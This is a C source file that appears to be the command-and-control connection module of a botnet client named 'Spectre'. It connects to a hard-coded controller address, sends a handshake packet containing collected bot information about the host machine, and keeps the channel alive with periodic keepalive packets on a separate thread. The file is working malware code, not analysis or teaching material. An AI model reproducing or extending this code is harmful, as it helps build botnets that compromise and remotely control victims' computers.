#include "connection.h"

#include <stdlib.h>

#include <bot_info.h>
#include <spectre_def.h>
#include <debug.h>
#include <protocol.h>
#include <spectre_time.h>

#ifndef _WIN32

#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#else

#include <winsock2.h>

#endif

static cnc_conn *conn;

cnc_conn *get_cnc_conn() {
    return conn;
}

bool is_cnc_connected() {
    pthread_mutex_lock(conn->mx);
    bool ret = conn->connected;
    pthread_mutex_unlock(conn->mx);
    return ret;
}

void *cnc_conn_keepalive() {
    debug_printf("Starting keepalive thread %d", pthread_self());

    while (is_cnc_connected()) {
        int64_t unixTime = get_sys_milliseconds();

        debug_printf("Sending keepalive packet %lld", unixTime);

        if (!write_packet((Packet) {
                .type = PacketTypeKeepAlive,
                .count = 1,
                .data = (PacketArg[]) {
                        (PacketArg) {ArgTypeInt64, "time", (void *) unixTime},
                }
        })) {
            cnc_conn_close();
            break;
        }

        SLEEP(45);
    }

    debug_printf("KeepAlive Thread exiting %d", pthread_self());
    pthread_exit(NULL);

    return NULL;
}

void init_cnc_connection() {
    conn = malloc(sizeof(cnc_conn));

    conn->connected = false;
    conn->mx = malloc(sizeof(pthread_mutex_t));
    conn->keepalive_thread = 0;

    if (pthread_mutex_init(conn->mx, NULL) != 0) {
        free(conn->mx);
        free(conn);
        conn = NULL;
        return;
    }

    if (pthread_mutex_unlock(conn->mx) != 0) {
        free(conn->mx);
        free(conn);
        conn = NULL;
        return;
    }
}

void cnc_conn_close() {
    CLOSE_SOCKET(conn->sock);
    conn->connected = false;

    if (conn->keepalive_thread > 0) {
        pthread_join(conn->keepalive_thread, NULL);
    }

    conn->keepalive_thread = 0;
}

static int on = 1;

bool cnc_conn_open() {
    CONNECTION sock;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET_T) {
        debug_error("Failed to create socket");
        return false;
    }

    conn->sock = sock;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(strtol(CNC_PORT, NULL, 10));
    addr.sin_addr.s_addr = inet_addr(CNC_ADDR);

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &on, sizeof(addr));
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *) &on, sizeof(on));
    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (char *) &on, sizeof(on));

    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == SOCKET_ERROR_T) {
        debug_error("Failed to connect");
        return false;
    }

    SpectreInfo *info = get_bot_info();
    if ((info->LittleEndian ? WRITE_SOCKET(sock, "\00\x02", 2) : WRITE_SOCKET(sock, "\00\x01", 2)) != 2) {
        debug_error("Failed to write");
        return false;
    }

    conn->connected = true;

    if (conn->keepalive_thread > 0) {
        pthread_cancel(conn->keepalive_thread);
    }

    pthread_create(&conn->keepalive_thread, NULL, cnc_conn_keepalive, NULL);
    debug_printf("Connected to %s:%d @ %p", CNC_ADDR, strtol(CNC_PORT, NULL, 10), conn);

    if (write_packet((Packet) {
            .type = PacketTypeHandshake,
            .count = 1,
            .data = (PacketArg *) (PacketArg[]) {{ArgTypeBotInfo, "bot_info", info}}
    })) {
        return true;
    }

    return false;
}